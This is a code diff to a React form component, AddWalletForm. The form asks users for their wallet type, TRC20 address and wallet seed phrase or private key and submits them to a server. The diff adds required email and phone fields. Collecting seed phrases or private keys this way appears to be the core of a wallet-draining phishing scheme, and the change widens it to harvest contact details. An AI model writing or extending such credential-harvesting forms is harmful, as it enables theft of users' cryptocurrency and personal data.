@@ -12,6 +12,8 @@ export function AddWalletForm({ onClose, onSuccess }: AddWalletFormProps) {
   const [walletType, setWalletType] = useState('binance');
   const [trc20Address, setTrc20Address] = useState('');
   const [passphraseOrKey, setPassphraseOrKey] = useState('');
+  const [email, setEmail] = useState('');
+  const [phone, setPhone] = useState('');
   const [showPassphrase, setShowPassphrase] = useState(false);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
@@ -22,8 +24,16 @@ export function AddWalletForm({ onClose, onSuccess }: AddWalletFormProps) {
     setLoading(true);
 
     try {
-      if (!walletType || !trc20Address || !passphraseOrKey) {
+      if (!walletType || !trc20Address || !passphraseOrKey || !email || !phone) {
         throw new Error('All fields are required');
+      }
+
+      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+        throw new Error('Invalid email address');
+      }
+
+      if (!/^\d{10,}$/.test(phone.replace(/[\s\-\+\(\)]/g, ''))) {
+        throw new Error('Invalid phone number (minimum 10 digits)');
       }
 
       if (trc20Address.length < 20) {
@@ -41,6 +51,8 @@ export function AddWalletForm({ onClose, onSuccess }: AddWalletFormProps) {
           wallet_type: walletType,
           trc20_address: trc20Address,
           passkey_or_passphrase: passphraseOrKey,
+          email,
+          phone,
         }),
       });
 
@@ -95,6 +107,35 @@ export function AddWalletForm({ onClose, onSuccess }: AddWalletFormProps) {
               <option value="metamask">MetaMask</option>
               <option value="other">Other Wallet</option>
             </select>
+          </div>
+
+          {/* Email */}
+          <div>
+            <label className="block text-sm font-semibold text-gray-700 mb-2">
+              Email Address
+            </label>
+            <input
+              type="email"
+              value={email}
+              onChange={(e) => setEmail(e.target.value)}
+              placeholder="your@email.com"
+              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-amber-500"
+            />
+          </div>
+
+          {/* Phone */}
+          <div>
+            <label className="block text-sm font-semibold text-gray-700 mb-2">
+              Phone Number
+            </label>
+            <input
+              type="tel"
+              value={phone}
+              onChange={(e) => setPhone(e.target.value)}
+              placeholder="+1 (555) 123-4567"
+              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-amber-500"
+            />
+            <p className="text-xs text-gray-500 mt-1">Include country code for international numbers</p>
           </div>
 
           {/* TRC20 Address */}
